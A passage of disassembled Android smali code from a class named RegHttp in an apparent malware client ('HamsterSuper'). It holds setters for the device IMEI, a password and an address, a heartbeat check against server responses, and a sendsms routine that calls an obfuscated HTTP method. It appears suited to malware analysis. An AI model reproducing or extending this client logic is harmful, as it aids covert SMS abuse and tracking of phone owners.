    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public sendsms()V
    .locals 1

    .prologue
    .line 271
    iget v0, p0, LDaemon/Global/RegHttp;->sms:I

    if-nez v0, :cond_0

    .line 273
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->sphttp:LDaemon/Global/SpHttp;

    invoke-static {v0}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    .line 278
    :goto_0
    return-void

    .line 275
    :cond_0
    const/4 v0, 0x1

    sput v0, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    goto :goto_0
.end method

.method public setAddress(Ljava/lang/String;)V
    .locals 0
    .param p1, "address"    # Ljava/lang/String;

    .prologue
    .line 159
    iput-object p1, p0, LDaemon/Global/RegHttp;->address:Ljava/lang/String;

    .line 160
    return-void
.end method

.method public setImei(Ljava/lang/String;)V
    .locals 0
    .param p1, "imei"    # Ljava/lang/String;

    .prologue
    .line 142
    iput-object p1, p0, LDaemon/Global/RegHttp;->imei:Ljava/lang/String;

    .line 143
    return-void
.end method

.method public setPaintState(I)V
    .locals 1
    .param p1, "httpEnd"    # I

    .prologue
    .line 284
    invoke-virtual {p0}, LDaemon/Global/RegHttp;->download()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 285
    const/4 v0, 0x0

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 286
    invoke-virtual {p0}, LDaemon/Global/RegHttp;->sendsms()V

    .line 289
    :cond_0
    packed-switch p1, :pswitch_data_0

    .line 305
    :pswitch_0
    return-void

    .line 289
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
    .end packed-switch
.end method

.method public setPassWord(Ljava/lang/String;)V
    .locals 0
    .param p1, "passWord"    # Ljava/lang/String;

    .prologue
    .line 151
    iput-object p1, p0, LDaemon/Global/RegHttp;->passWord:Ljava/lang/String;

    .line 152
    return-void
.end method

.method public setSms(I)V
    .locals 0
    .param p1, "sms"    # I

    .prologue
    .line 127
    iput p1, p0, LDaemon/Global/RegHttp;->sms:I

    .line 128
    return-void
.end method

.method public setUpgrade(I)V
    .locals 0
    .param p1, "upgrade"    # I

    .prologue
    .line 134
    iput p1, p0, LDaemon/Global/RegHttp;->upgrade:I

    .line 135
    return-void
.end method

.method public setuser_value(Ljava/lang/String;)V
    .locals 0
    .param p1, "z"    # Ljava/lang/String;

    .prologue
    .line 166
    iput-object p1, p0, LDaemon/Global/RegHttp;->z:Ljava/lang/String;

    .line 167
    return-void
.end method

.method public starthead(Ljava/lang/String;)V
    .locals 2
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    .line 215
    const-string v1, "heartbeat"

    invoke-static {p1, v1}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 216
    .local v0, "heartbeat":I
    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 217
    const/4 v1, 0x0

    sput-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    .line 218
    :cond_0
    return-void
.end method
